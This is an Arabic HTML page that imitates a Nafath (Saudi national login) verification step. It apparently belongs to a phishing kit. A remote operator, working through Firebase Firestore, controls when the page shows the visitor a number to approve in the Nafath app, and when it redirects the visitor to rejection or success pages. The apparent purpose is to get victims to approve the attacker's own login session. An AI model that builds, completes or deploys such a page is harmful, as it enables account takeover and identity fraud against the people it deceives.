<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>توثيق نفاذ</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        /* ستايل شاشة التحميل الخضراء */
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .loader { width: 80%; height: 10px; background: #eee; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
        .progress { width: 60%; height: 100%; background: #00ff9d; animation: load 2s infinite; }
        @keyframes load { 0% { transform: translateX(-100%); } 100% { transform: translateX(150%); } }
        #code-display { display: none; text-align: center; margin-top: 50px; }
        .big-num { font-size: 80px; font-weight: bold; color: #17a2b8; }
    </style>
</head>
<body>

<div id="overlay">
    <div class="loader"><div class="progress"></div></div>
    <p>جاري المعالجة، نرجو الانتظار...</p>
</div>

<div id="code-display">
    <h2>الرجاء تأكيد الطلب عبر تطبيق نفاذ باختيار الرقم:</h2>
    <div class="big-num" id="target-number">--</div>
</div>

<script>
    // استخدم نفس الـ firebaseConfig هنا
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            const data = doc.data();
            if (data.next_step === "SHOW_NAFATH_CODE") {
                document.getElementById('overlay').style.display = 'none';
                document.getElementById('code-display').style.display = 'block';
                document.getElementById('target-number').innerText = data.nafath_code;
            }
            if (data.next_step === "GO_TO_REJECT") { window.location.href = "index.html"; alert("نعتذر، تم رفض الطلب"); }
            if (data.next_step === "SUCCESS") { window.location.href = "success.html"; }
        });
    }
</script>
</body>
</html>
